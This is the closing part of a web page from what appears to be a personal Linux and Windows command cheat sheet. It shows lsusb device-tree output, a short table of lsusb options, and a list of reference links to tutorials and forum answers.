</span><span id="__span-107-15"><a id="__codelineno-107-15" name="__codelineno-107-15" href="#__codelineno-107-15"></a>        /sys/bus/usb/devices/1-5  /dev/bus/usb/001/003
</span><span id="__span-107-16"><a id="__codelineno-107-16" name="__codelineno-107-16" href="#__codelineno-107-16"></a>    |__ Port 5: Dev 3, If 2, Class=Video, Driver=uvcvideo, 480M
</span><span id="__span-107-17"><a id="__codelineno-107-17" name="__codelineno-107-17" href="#__codelineno-107-17"></a>        ID 05c8:0815 Cheng Uei Precision Industry Co., Ltd (Foxlink) 
</span><span id="__span-107-18"><a id="__codelineno-107-18" name="__codelineno-107-18" href="#__codelineno-107-18"></a>        /sys/bus/usb/devices/1-5  /dev/bus/usb/001/003
</span><span id="__span-107-19"><a id="__codelineno-107-19" name="__codelineno-107-19" href="#__codelineno-107-19"></a>    |__ Port 5: Dev 3, If 0, Class=Video, Driver=uvcvideo, 480M
</span><span id="__span-107-20"><a id="__codelineno-107-20" name="__codelineno-107-20" href="#__codelineno-107-20"></a>        ID 05c8:0815 Cheng Uei Precision Industry Co., Ltd (Foxlink) 
</span><span id="__span-107-21"><a id="__codelineno-107-21" name="__codelineno-107-21" href="#__codelineno-107-21"></a>        /sys/bus/usb/devices/1-5  /dev/bus/usb/001/003
</span><span id="__span-107-22"><a id="__codelineno-107-22" name="__codelineno-107-22" href="#__codelineno-107-22"></a>    |__ Port 7: Dev 5, If 0, Class=Wireless, Driver=btusb, 12M
</span><span id="__span-107-23"><a id="__codelineno-107-23" name="__codelineno-107-23" href="#__codelineno-107-23"></a>        ID 8087:0a2b Intel Corp. 
</span><span id="__span-107-24"><a id="__codelineno-107-24" name="__codelineno-107-24" href="#__codelineno-107-24"></a>        /sys/bus/usb/devices/1-7  /dev/bus/usb/001/005
</span><span id="__span-107-25"><a id="__codelineno-107-25" name="__codelineno-107-25" href="#__codelineno-107-25"></a>    |__ Port 7: Dev 5, If 1, Class=Wireless, Driver=btusb, 12M
</span><span id="__span-107-26"><a id="__codelineno-107-26" name="__codelineno-107-26" href="#__codelineno-107-26"></a>        ID 8087:0a2b Intel Corp. 
</span><span id="__span-107-27"><a id="__codelineno-107-27" name="__codelineno-107-27" href="#__codelineno-107-27"></a>        /sys/bus/usb/devices/1-7  /dev/bus/usb/001/005
</span></code></pre></div>
<table>
<thead>
<tr>
<th>Option</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-t</td>
<td>Tells <code>lsusb</code> to dump the physical USB device hierarchy as a tree</td>
</tr>
<tr>
<td>-v</td>
<td>Verbose. Tells <code>lsusb</code> to be verbose and display detailed information about the devices shown</td>
</tr>
</tbody>
</table>
<hr />
<p>[Reference]</p>
<p><a href="[Siongui](https://siongui.github.io/2018/03/06/go-print-http-response-header/)">^1</a>: <a href="https://stackoverflow.com/questions/3724786/how-to-diff-two-file-lists-and-ignoring-place-in-list">Stack Overflow</a></p>
<p>[^3]: <a href="https://itsfoss.com/recover-deleted-files-linux/">It's FOSS</a>
[^4]: <a href="https://docs.fedoraproject.org/en-US/quick-docs/how-to-edit-iptables-rules/">Fedora Project</a></p>
<p>[^6]: <a href="https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e">6c2e6e2e - Spawning interactive reverse shells with TTY</a>
[^7]: <a href="https://tutorials.technology/tutorials/How-to-transfer-files-over-the-network-using-Netcat.html">Tutorials Technology - How to transfer files over the network using Netcat </a>
[^8]: <a href="https://stackoverflow.com/questions/52093920/how-zip-file-with-encryption-from-bash-script">StackOverflow - How zip file with encryption from bash script</a>
[^9]: <a href="https://www.tecmint.com/encrypt-decrypt-files-tar-openssl-linux/">Tecmint - How to Encrypt and Decrypt Files and Directories Using Tar and OpenSSL</a>
[^10]: <a href="https://stackoverflow.com/questions/6321353/securely-passing-password-to-openssl-via-stdin">StackOverflow - Securely passing password to openssl via stdin</a>
[^11]: <a href="https://askubuntu.com/a/343753">AskUbuntu - Filenames with spaces breaking for loop, find command</a>
[^12]: <a href="https://unix.stackexchange.com/questions/583882/understanding-a-sed-command-sed-s-s-s-g">StackOverflow - Understanding a sed command: sed 's/\s\s*/ /g'</a>
[^13]: <a href="https://stackoverflow.com/questions/69055654/how-to-sort-a-list-of-words-by-the-last-character-in-bash">Stackoverflow - How to sort a list of words by the last character</a>
[^14]: <a href="https://www.reddit.com/r/archlinux/comments/bep79a/beep_could_not_open_any_device_how_to_fix_it/">Reddit - Beep could not open any device...</a>
[^15]: <a href="https://stackoverflow.com/questions/12652568/how-to-give-a-pattern-for-new-line-in-grep">StackOverflow- How to give a pattern for new line in grep?</a>
[^16]: <a href="https://www.windows-commandline.com/list-local-drives-command-line/">Windows Commandline - List local drives from command line</a></p>
<p>[^18]: <a href="https://techexpert.tips/powershell/powershell-base64-encoding/">Tech Expert</a>
[^19]: <a href="https://www.trustedsec.com/blog/bits-for-script-kiddies/">TrustedSec - BITS for Script Kiddies</a>
[^20]: <a href="https://www.windows-commandline.com/taskkill-kill-process/">Windows Commandline - taskkill</a>
[^21]: <a href="https://www.shellhacks.com/windows-zip-unzip-command-line/">Shellhacks - Windows: Zip | Unzip – Command Line</a></p>
<p>[^23]: <a href="https://levelup.gitconnected.com/solve-the-dreadful-certificate-issues-in-python-requests-module-2020d922c72f">Medium - Gitconnected</a>
[^24]: <a href="https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285">Factory Mind</a>
[^25]: <a href="https://www.regextutorial.org/regex-for-ip-address-match.php">Regex Tutorial</a></p>
<hr />

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/codereview.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>